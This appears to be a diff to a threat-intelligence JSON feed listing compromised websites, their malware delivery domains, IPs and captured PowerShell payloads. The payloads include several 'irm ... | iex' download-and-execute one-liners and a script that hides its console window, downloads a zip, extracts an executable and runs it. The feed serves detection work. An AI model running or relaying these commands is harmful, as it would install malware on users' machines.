@@ -1,5 +1,88 @@
 [
   {
+    "UrlDomain": "constelacioneselenaneira.es",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "172.67.200.243"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/41d88dcc57a5f96c",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&amp;_v=29926231",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/41d88dcc57a5f96c'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/41d88dcc57a5f96c"
+    ],
+    "ReportId": "cmwvictk00ep70nmlz5fj9rod",
+    "ScannedAt": "2026-11-25T02:32:07.384000+00:00"
+  },
+  {
+    "UrlDomain": "techiesbuzz.com",
+    "DeliveryUrl": [
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "162.241.123.168"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwvic5jb0enp0nmlyqy9objn",
+    "ScannedAt": "2026-11-25T02:31:36.239000+00:00"
+  },
+  {
+    "UrlDomain": "expertseedbank.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/b8fd8c7cc531af4a"
+    ],
+    "IP": [
+      "141.193.213.10"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/b8fd8c7cc531af4a')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/b8fd8c7cc531af4a"
+    ],
+    "ReportId": "cmwvgde1d0elj0nmlvb8f17fw",
+    "ScannedAt": "2026-11-25T01:36:34.706000+00:00"
+  },
+  {
+    "UrlDomain": "coppkbr.ru",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/a3d86f2e72d08c5e"
+    ],
+    "IP": [
+      "37.18.61.132"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/a3d86f2e72d08c5e')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/a3d86f2e72d08c5e"
+    ],
+    "ReportId": "cmwvgcc250ejp0nml79vyx8ba",
+    "ScannedAt": "2026-11-25T01:35:45.447000+00:00"
+  },
+  {
     "UrlDomain": "aga-pics.com",
     "DeliveryUrl": [],
     "PayloadUrl": [],
